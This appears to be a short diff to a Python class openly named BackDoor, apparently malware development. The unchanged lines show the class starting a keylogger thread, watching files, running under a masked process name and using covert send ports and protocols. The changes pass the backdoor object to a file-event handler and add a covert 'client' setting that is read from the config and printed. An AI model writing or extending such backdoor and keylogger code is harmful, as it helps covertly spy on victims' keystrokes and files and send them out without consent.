@@ -151,7 +151,7 @@ class BackDoor:
             keylog_t = Thread(target=self.start_keylogger)
             keylog_t.start()
 
-            event_handler = EventHandler(self.watch_file)
+            event_handler = EventHandler(self.watch_file, self)
             observer = Observer()
             observer.schedule(event_handler, self.watch_dir, recursive=True)
             observer.start()
@@ -195,6 +195,7 @@ class BackDoor:
         self.send_port = config['covert']['send_port']
         self.proto = config['share']['proto']
         self.watch_dir, self.watch_file = self.watch_settings(config['covert']['watch'])
+        self.client = config['covert']['client']
         print(f"Masked as {self.masked_name}")
         print(f"log to {self.log}")
         print(f"device is {self.device}")
@@ -203,6 +204,7 @@ class BackDoor:
         print(f"proto  is {self.proto}")
         print(f"file  is {self.watch_file}")
         print(f"dir  is {self.watch_dir}")
+        print(f"client default is {self.client}")
 
     def watch_settings(self, path) -> tuple[str,str]:
         file = path.split("/")[-1]
